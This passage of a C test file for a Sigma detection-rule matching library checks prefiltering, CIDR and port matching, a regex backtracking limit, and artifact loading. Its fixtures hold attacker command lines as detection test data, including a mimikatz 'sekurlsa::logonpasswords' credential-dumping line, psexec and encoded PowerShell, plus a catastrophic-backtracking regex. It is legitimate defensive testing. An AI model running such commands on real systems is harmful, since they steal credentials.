     * must still agree with linear on the hit set. */
    {
        kv_t kv[] = {{"event.category", "process"},
                     {"process.executable", "C:\\tools\\mimikatz.exe"},
                     {"process.command_line", "psexec.exe -accepteula cmd"}};
        event_t e = {kv, 3};
        CHECK(!fires(ev, &e, 2001, NULL), "cnf: needles in the wrong fields -> no fire");
        CHECK(hitset_eq(ev, &e), "cnf==linear: crossed-fields event");
    }

    /* Single-clause: whoami in Image must not select 2002; whoami in CommandLine
     * must.  Linear agrees either way (the predicate names CommandLine). */
    {
        kv_t kv[] = {{"event.category", "process"},
                     {"process.executable", "C:\\Windows\\whoami.exe"},
                     {"process.command_line", "whoami.exe /all"}};
        event_t e = {kv, 3};
        CHECK(fires(ev, &e, 2002, NULL), "cnf: whoami in CommandLine -> fire");
        CHECK(hitset_eq(ev, &e), "cnf==linear: whoami-in-cmd event");
    }
    {
        kv_t kv[] = {{"event.category", "process"},
                     {"process.executable", "C:\\Windows\\whoami.exe"},
                     {"process.command_line", "cmd.exe /c echo hi"}};
        event_t e = {kv, 3};
        CHECK(!fires(ev, &e, 2002, NULL), "cnf: whoami only in Image -> pruned");
        CHECK(hitset_eq(ev, &e), "cnf==linear: whoami-in-image-only event");
    }

    sigma_eval_free(ev);
    sigma_db_free(&d);
    free(buf);
    sigma_db_free(&db);
    free(t);
}

/* Numeric and CIDR CNF atoms (v5 field witnesses).  A rule whose only necessary
 * atom is a number or a CIDR leaves always-verify; mixed string AND port needs
 * both clauses.  Soundness is still pf==linear. */
static void test_prefilter_fwit(void) {
    /* --- fwit-only (no Teddy): numeric + CIDR leave always-verify --- */
    {
        tb_t* t = calloc(1, sizeof(*t));
        assert(t);
        uint16_t f_port, f_ip;
        (void)tb_field(t, "event.category");
        {
            uint32_t ps = t->db.n_preds;
            tb_pred_num(t, "destination.port", SIGMA_OP_GT, 1024, 0);
            f_port = t->preds[ps].field_id;
            tb_rule(t, 3001, tb_sel(t, ps), 1, 0, 0, SIGMA_VERDICT_ALERT, 1, 10);
        }
        {
            uint32_t ps = t->db.n_preds;
            uint32_t cid = tb_cidr(t, "10.0.0.0/8");
            tb_pred_cidr(t, "source.ip", cid, 0);
            f_ip = t->preds[ps].field_id;
            tb_rule(t, 3002, tb_sel(t, ps), 1, 0, 0, SIGMA_VERDICT_ALERT, 2, 20);
            tb_fwit(t, 1, f_ip, 0, SIGMA_OP_CIDR, (int64_t)cid);
        }
        tb_fwit(t, 0, f_port, 0, SIGMA_OP_GT, 1024);
        uint32_t ids[] = {0, 1};
        tb_bucket(t, "network", ids, 2);
        tb_bucket(t, "", NULL, 0);

        sigma_db_t db = tb_finish(t);
        uint8_t* buf = NULL;
        size_t len = 0;
        CHECK(sigma_db_serialize(&db, &buf, &len) == SIGMA_OK, "fwit: serialize ok");
        uint8_t* copy = malloc(len);
        assert(copy);
        memcpy(copy, buf, len);
        sigma_db_t d;
        memset(&d, 0, sizeof(d));
        CHECK(sigma_db_load_buffer(copy, len, &d) == SIGMA_OK, "fwit: load ok");
        CHECK(d.teddy == NULL, "fwit-only: no Teddy matcher");
        CHECK(d.n_fwit == 2, "fwit-only: 2 field witnesses");
        CHECK(d.n_litav == 0, "fwit-only: nothing in always-verify");
        CHECK(d.n_litndl == 0, "fwit-only: no string needles");

        sigma_eval_t* ev = sigma_eval_create(&d);
        assert(ev);
        sigma_eval_set_prefilter(ev, 2);
        {
            kv_t kv[] = {{"event.category", "network"}, {"destination.port", "4444"}};
            event_t e = {kv, 2};
            CHECK(fires(ev, &e, 3001, NULL), "fwit: port>1024 fires with no teddy");
            CHECK(!fires(ev, &e, 3002, NULL), "fwit: CIDR absent -> pruned");
            CHECK(hitset_eq(ev, &e), "fwit==linear: port-only event");
        }
        {
            kv_t kv[] = {{"event.category", "network"}, {"destination.port", "80"}};
            event_t e = {kv, 2};
            CHECK(!fires(ev, &e, 3001, NULL), "fwit: port 80 does not satisfy GT 1024");
            CHECK(hitset_eq(ev, &e), "fwit==linear: low-port event");
        }
        {
            kv_t kv[] = {{"event.category", "network"}, {"source.ip", "10.1.2.3"}};
            event_t e = {kv, 2};
            CHECK(fires(ev, &e, 3002, NULL), "fwit: 10.1.2.3 in 10.0.0.0/8");
            CHECK(!fires(ev, &e, 3001, NULL), "fwit: no port -> numeric pruned");
            CHECK(hitset_eq(ev, &e), "fwit==linear: cidr event");
        }
        {
            kv_t kv[] = {{"event.category", "network"}, {"source.ip", "8.8.8.8"}};
            event_t e = {kv, 2};
            CHECK(!fires(ev, &e, 3002, NULL), "fwit: 8.8.8.8 not in 10.0.0.0/8");
            CHECK(hitset_eq(ev, &e), "fwit==linear: outside-cidr event");
        }
        sigma_eval_free(ev);
        sigma_db_free(&d);
        free(buf);
        sigma_db_free(&db);
        free(t);
    }

    /* --- mixed string AND port: both clauses required --- */
    {
        tb_t* t = calloc(1, sizeof(*t));
        assert(t);
        uint16_t f_cmd, f_port;
        (void)tb_field(t, "event.category");
        {
            uint32_t ps = t->db.n_preds;
            tb_pred_str(t, "process.command_line", SIGMA_OP_CONTAINS, "mimikatz", 0, 0);
            f_cmd = t->preds[ps].field_id;
            tb_pred_num(t, "destination.port", SIGMA_OP_GTE, 80, 1);
            tb_pred_num(t, "destination.port", SIGMA_OP_LTE, 80, 2);
            f_port = t->preds[ps + 1].field_id;
            tb_rule(t, 3003, tb_sel(t, ps), 1, 0, 0, SIGMA_VERDICT_ALERT, 4, 50);
        }
        uint32_t ids[] = {0};
        tb_bucket(t, "network", ids, 1);
        tb_bucket(t, "", NULL, 0);
        sigma_litref_t r_mimi[] = {{0, f_cmd, 0, 0}};
        tb_litrefs(t, "mimikatz", r_mimi, 1);
        tb_fwit(t, 0, f_port, 1, SIGMA_OP_NUMEQ, 80);

        sigma_db_t db = tb_finish(t);
        uint8_t* buf = NULL;
        size_t len = 0;
        CHECK(sigma_db_serialize(&db, &buf, &len) == SIGMA_OK, "fwit-mix: serialize ok");
        uint8_t* copy = malloc(len);
        assert(copy);
        memcpy(copy, buf, len);
        sigma_db_t d;
        memset(&d, 0, sizeof(d));
        CHECK(sigma_db_load_buffer(copy, len, &d) == SIGMA_OK, "fwit-mix: load ok");
        CHECK(d.n_fwit == 1, "fwit-mix: 1 numeric witness");
        CHECK(d.n_litndl == 1, "fwit-mix: 1 teddy needle");
        CHECK(d.rule_clauses && d.rule_clauses[0] == 2, "fwit-mix: 2 witness clauses");
        CHECK(d.teddy != NULL, "fwit-mix: Teddy built");

        sigma_eval_t* ev = sigma_eval_create(&d);
        assert(ev);
        sigma_eval_set_prefilter(ev, 2);
        {
            kv_t kv[] = {{"event.category", "network"},
                         {"process.command_line", "mimikatz.exe sekurlsa"},
                         {"destination.port", "80"}};
            event_t e = {kv, 3};
            CHECK(fires(ev, &e, 3003, NULL), "fwit-mix: both clauses hold -> fire");
            CHECK(hitset_eq(ev, &e), "fwit-mix==linear: both-clauses event");
        }
        {
            kv_t kv[] = {{"event.category", "network"},
                         {"process.command_line", "mimikatz.exe sekurlsa"},
                         {"destination.port", "443"}};
            event_t e = {kv, 3};
            CHECK(!fires(ev, &e, 3003, NULL), "fwit-mix: needle without port 80 -> pruned");
            CHECK(hitset_eq(ev, &e), "fwit-mix==linear: needle-only event");
        }
        {
            kv_t kv[] = {
                {"event.category", "network"}, {"process.command_line", "notepad.exe"}, {"destination.port", "80"}};
            event_t e = {kv, 3};
            CHECK(!fires(ev, &e, 3003, NULL), "fwit-mix: port 80 without needle -> pruned");
            CHECK(hitset_eq(ev, &e), "fwit-mix==linear: port-only mixed event");
        }
        sigma_eval_free(ev);
        sigma_db_free(&d);
        free(buf);
        sigma_db_free(&db);
        free(t);
    }
}

/* CWE-1333: a |re predicate matches an attacker-controlled field value
 * against a pattern the .sigmac loader validates structurally but not for
 * worst-case backtracking complexity. Without an application-set PCRE2
 * match/depth limit, matcher.c fell back to PCRE2's own compiled-in
 * default (10,000,000 on a stock build -- confirmed via pcre2_config()),
 * a number libsigma neither chooses nor can rely on being consistent
 * across the amd64/aarch64 x Debian/Ubuntu/Alpine/FreeBSD/macOS matrix it
 * ships for. Two things must hold with the fix in place: a classic
 * catastrophic-backtracking pattern against an adversarial non-matching
 * subject still resolves to the CORRECT answer (no rule fires -- hitting
 * a limit and exhausting the pattern legitimately both return a negative
 * PCRE2 code, already handled identically by the existing `>= 0` check,
 * so this changes worst-case TIME only, never correctness) inside a
 * generous bound; and an ordinary, non-pathological |re rule keeps
 * matching a normal, moderately long benign value exactly as before. */
static void test_re_match_limit_bounded(void) {
    /* --- adversarial: ^(a+)+$ against a long run of 'a' + a trailing
     * mismatch is the textbook catastrophic-backtracking shape. n=40 is
     * unreachable from the loader's own bounds/CRC checks (this is a
     * behavioral, not structural, input) and, empirically, costs the
     * *default* PCRE2 policy 100-1000x this test's bound on the
     * interpreted matcher path (a live fallback: pcre2_jit_compile's
     * return value is intentionally ignored -- JIT is best-effort, not
     * guaranteed -- so some pattern/platform combination always exercises
     * the interpreted matcher this bound also has to hold for). */
    {
        tb_t* t = calloc(1, sizeof(*t));
        assert(t);
        {
            uint32_t ps = t->db.n_preds;
            tb_pred_str(t, "process.command_line", SIGMA_OP_RE, "^(a+)+$", 0, 0);
            tb_rule(t, 4001, tb_sel(t, ps), 1, 0, 0, SIGMA_VERDICT_ALERT, 3, 30);
        }
        sigma_db_t db = tb_finish(t);
        uint8_t* buf = NULL;
        size_t len = 0;
        CHECK(sigma_db_serialize(&db, &buf, &len) == SIGMA_OK, "re-limit: serialize ok");
        uint8_t* copy = malloc(len);
        assert(copy);
        memcpy(copy, buf, len);
        sigma_db_t d;
        memset(&d, 0, sizeof(d));
        CHECK(sigma_db_load_buffer(copy, len, &d) == SIGMA_OK, "re-limit: load ok (compiles the RE)");

        char adversarial[42];
        memset(adversarial, 'a', 40);
        adversarial[40] = 'X'; /* breaks the match only at the very end */
        adversarial[41] = '\0';

        sigma_eval_t* ev = sigma_eval_create(&d);
        assert(ev);
        kv_t kv[] = {{"process.command_line", adversarial}};
        event_t e = {kv, 1};

        clock_t t0 = clock();
        bool fired = fires(ev, &e, 4001, NULL);
        double secs = (double)(clock() - t0) / CLOCKS_PER_SEC;

        CHECK(!fired, "re-limit: ^(a+)+$ vs adversarial non-match must not fire");
        /* Generous: the bounded path measured well under 0.01s in
         * development; 2s leaves ample headroom for a slow/loaded CI
         * runner while still failing hard if the match_context is ever
         * dropped and a build/platform combination hits a much larger
         * (or absent) PCRE2 default on the interpreted matcher path. */
        CHECK(secs < 2.0, "re-limit: adversarial match must stay bounded (CWE-1333)");

        sigma_eval_free(ev);
        sigma_db_free(&d);
        free(buf);
        sigma_db_free(&db);
        free(t);
    }

    /* --- benign: an ordinary anchored alternation against a normal,
     * moderately long legitimate command line must still fire. Proves the
     * new match/depth limit does not turn into a false negative on real
     * traffic; 100000/10000 is generous relative to any real Sigma |re
     * pattern's actual step count. */
    {
        tb_t* t = calloc(1, sizeof(*t));
        assert(t);
        {
            uint32_t ps = t->db.n_preds;
            tb_pred_str(t, "process.command_line", SIGMA_OP_RE, "(mimikatz|sekurlsa)\\.exe", 0, 0);
            tb_rule(t, 4002, tb_sel(t, ps), 1, 0, 0, SIGMA_VERDICT_ALERT, 3, 30);
        }
        sigma_db_t db = tb_finish(t);
        uint8_t* buf = NULL;
        size_t len = 0;
        CHECK(sigma_db_serialize(&db, &buf, &len) == SIGMA_OK, "re-limit: benign serialize ok");
        uint8_t* copy = malloc(len);
        assert(copy);
        memcpy(copy, buf, len);
        sigma_db_t d;
        memset(&d, 0, sizeof(d));
        CHECK(sigma_db_load_buffer(copy, len, &d) == SIGMA_OK, "re-limit: benign load ok");

        char benign[256];
        snprintf(benign, sizeof(benign),
                 "C:\\Windows\\System32\\cmd.exe /c C:\\tools\\mimikatz.exe "
                 "privilege::debug sekurlsa::logonpasswords exit");

        sigma_eval_t* ev = sigma_eval_create(&d);
        assert(ev);
        kv_t kv[] = {{"process.command_line", benign}};
        event_t e = {kv, 1};
        CHECK(fires(ev, &e, 4002, NULL), "re-limit: benign match still fires under the new limit");

        sigma_eval_free(ev);
        sigma_db_free(&d);
        free(buf);
        sigma_db_free(&db);
        free(t);
    }
}

/* The loader accepts SIGMA_FORMAT_VERSION_MIN through SIGMA_FORMAT_VERSION: a
 * well-formed artifact whose ONLY defect is a wrong version must be REJECTED
 * cleanly with SIGMA_ERR_VERSION and leave the out-db untouched (no ownership
 * taken on failure). We serialize a valid artifact, flip the version, and
 * repair the trailing CRC so the version is the only thing wrong. */
static void test_wrong_version_rejected(void) {
    tb_t* t = calloc(1, sizeof(*t));
    assert(t);
    {
        uint32_t ps = t->db.n_preds;
        tb_pred_str(t, "url.path", SIGMA_OP_CONTAINS, "/admin", 0, 0);
        tb_rule(t, 10, tb_sel(t, ps), 1, 0, 0, SIGMA_VERDICT_ALERT, 2, 20);
    }
    sigma_db_t db = tb_finish(t);
    uint8_t* buf = NULL;
    size_t len = 0;
    assert(sigma_db_serialize(&db, &buf, &len) == SIGMA_OK);

    uint32_t bad = SIGMA_FORMAT_VERSION + 1u;
    memcpy(buf + 4, &bad, 4);
    uint32_t crc = sigma_crc32c(0, buf, len - 4u);
    memcpy(buf + len - 4u, &crc, 4);

    sigma_db_t d;
    memset(&d, 0, sizeof(d));
    int rc = sigma_db_load_buffer(buf, len, &d);
    CHECK(rc == SIGMA_ERR_VERSION, "wrong version: rejected cleanly (SIGMA_ERR_VERSION)");
    CHECK(d.backing == NULL, "wrong version: rejected => out-db left untouched");
    free(buf); /* load_buffer did NOT take ownership on failure */
    sigma_db_free(&db);
    free(t);
}

/* field-name NUL guarantee: after a serialize->load round-trip every field
 * name is NUL-terminated in the strpool (strpool[off + len] == '\0'), and the
 * zero-copy field-resolve callback resolves a field correctly when handed the
 * strpool pointer directly (the caller callback contract, no bounce copy). */
static const char* cstr_lookup_fn(void* ctx, const char* name, uint32_t name_len, size_t* out_len) {
    /* The matcher promises `name` is a valid C string, exercise that:
     * resolve via strcmp (NUL-reliant), ignoring name_len, exactly as the real
     * ln_fast_result_get_string() path would. */
    const event_t* e = (const event_t*)ctx;
    (void)name_len;
    *out_len = 0;
    for (int i = 0; i < e->n; i++) {
        if (strcmp(e->kv[i].k, name) == 0) { /* strlen(name) => name must be NUL-term */
            *out_len = strlen(e->kv[i].v);
            return e->kv[i].v;
        }
    }
    return NULL;
}

static void test_v2_field_names_nul_terminated(void) {
    tb_t* t = calloc(1, sizeof(*t));
    assert(t);
    {
        uint32_t ps = t->db.n_preds;
        tb_pred_str(t, "process.command_line", SIGMA_OP_CONTAINS, "-enc", 0, 0);
        tb_rule(t, 42, tb_sel(t, ps), 1, 0, 0, SIGMA_VERDICT_ALERT, 3, 30);
    }
    sigma_db_t db = tb_finish(t);

    uint8_t* buf = NULL;
    size_t len = 0;
    CHECK(sigma_db_serialize(&db, &buf, &len) == SIGMA_OK, "nul: serialize ok");
    uint8_t* copy = malloc(len);
    assert(copy);
    memcpy(copy, buf, len);
    sigma_db_t d;
    memset(&d, 0, sizeof(d));
    CHECK(sigma_db_load_buffer(copy, len, &d) == SIGMA_OK, "nul: load ok (terminators valid)");

    /* Every field NAME is NUL-terminated inside the loaded strpool. */
    bool all_term = true;
    for (uint32_t i = 0; i < d.n_fields; i++) {
        size_t end = (size_t)d.fields[i].off + d.fields[i].len;
        if (end >= d.strpool_len || d.strpool[end] != '\0') {
            all_term = false;
            break;
        }
    }
    CHECK(all_term, "nul: all field names NUL-terminated in strpool");

    /* Zero-copy resolve: hand the strpool pointer (a C string now) to a lookup
     * that strcmp's it, proves the matcher's callback contract holds. */
    sigma_eval_t* ev = sigma_eval_create(&d);
    assert(ev);
    {
        kv_t kv[] = {{"process.command_line", "powershell -enc AAAA"}};
        event_t e = {kv, 1};
        sigma_hit_t hits[8];
        int n = sigma_eval_run(ev, cstr_lookup_fn, (void*)&e, hits, 8);
        CHECK(n == 1 && hits[0].rule_id == 42, "nul: zero-copy C-string callback resolves the field + rule fires");
    }
    sigma_eval_free(ev);

    /* Tamper: clobber a field-name terminator -> the loader must reject it. */
    {
        uint8_t* bad = malloc(len);
        assert(bad);
        memcpy(bad, buf, len);
        sigma_hdr_t h;
        memcpy(&h, bad, sizeof(h));
        uint32_t foff, flen;
        memcpy(&foff, bad + h.off_fields, 4);
        memcpy(&flen, bad + h.off_fields + 4, 4);
        bad[h.off_strpool + foff + flen] = 'X'; /* was '\0' */
        uint32_t crc = sigma_crc32c(0, bad, len - 4u); /* keep CRC valid */
        memcpy(bad + len - 4u, &crc, 4);
        sigma_db_t junk;
        memset(&junk, 0, sizeof(junk));
        CHECK(sigma_db_load_buffer(bad, len, &junk) == SIGMA_ERR_RANGE,
              "nul: non-terminated field name rejected (SIGMA_ERR_RANGE)");
        free(bad);
    }

    sigma_db_free(&d); /* frees copy */
    free(buf);
    sigma_db_free(&db);
    free(t);
}

int main(void) {
    tb_t* t = calloc(1, sizeof(*t));
    assert(t);
    build_rules(t);
    sigma_db_t db = tb_finish(t);
    CHECK(sigma_db_finalize(&db) == 0, "finalize (compile regex) ok");

    /* Pass 1: matcher against the in-memory db. */
    run_battery(&db, "in-memory");

    /* Pass 2: serialize -> load -> same battery (artifact round-trip). */
    uint8_t* buf = NULL;
    size_t len = 0;
    CHECK(sigma_db_serialize(&db, &buf, &len) == SIGMA_OK, "serialize ok");
    CHECK(buf && len > sizeof(sigma_hdr_t), "artifact has content");

    /* load_buffer takes ownership on success: hand it a private copy. */
    uint8_t* copy = malloc(len);
    assert(copy);
    memcpy(copy, buf, len);
    sigma_db_t db2;
    memset(&db2, 0, sizeof(db2));
    CHECK(sigma_db_load_buffer(copy, len, &db2) == SIGMA_OK, "load round-trip ok");
    run_battery(&db2, "loaded");
    sigma_db_free(&db2); /* frees `copy` (backing) */

    /* Pass 3: CRC corruption must be rejected. */
    {
        uint8_t* bad = malloc(len);
        assert(bad);
        memcpy(bad, buf, len);
        bad[sizeof(sigma_hdr_t) + 1] ^= 0xFF; /* flip a payload byte */
        sigma_db_t junk;
        memset(&junk, 0, sizeof(junk));
        int rc = sigma_db_load_buffer(bad, len, &junk);
        CHECK(rc == SIGMA_ERR_CRC, "corrupted artifact rejected (CRC)");
        free(bad);
    }

    /* Pass 4: bad magic rejected. */
    {
        uint8_t* bad = malloc(len);
        assert(bad);
        memcpy(bad, buf, len);
        bad[0] ^= 0xFF;
        sigma_db_t junk;
        memset(&junk, 0, sizeof(junk));
        CHECK(sigma_db_load_buffer(bad, len, &junk) == SIGMA_ERR_MAGIC, "bad magic rejected");
        free(bad);
    }

    free(buf);
    sigma_db_free(&db);
    free(t);

    /* bucket index (soundness, narrowing) + field-name contract. */
    test_buckets();
    test_product_route();
    test_route_union();
    test_route_parser_stamp();
    test_wrong_version_rejected();
    test_v2_field_names_nul_terminated();
    /* SIMD literal prefilter soundness + narrowing. */
    test_prefilter();
    test_prefilter_cnf();
    test_prefilter_fwit();
    test_re_match_limit_bounded();

    printf("\nlibsigma matcher+format: %d passed, %d failed\n", g_pass, g_fail);
    return g_fail ? 1 : 0;
}
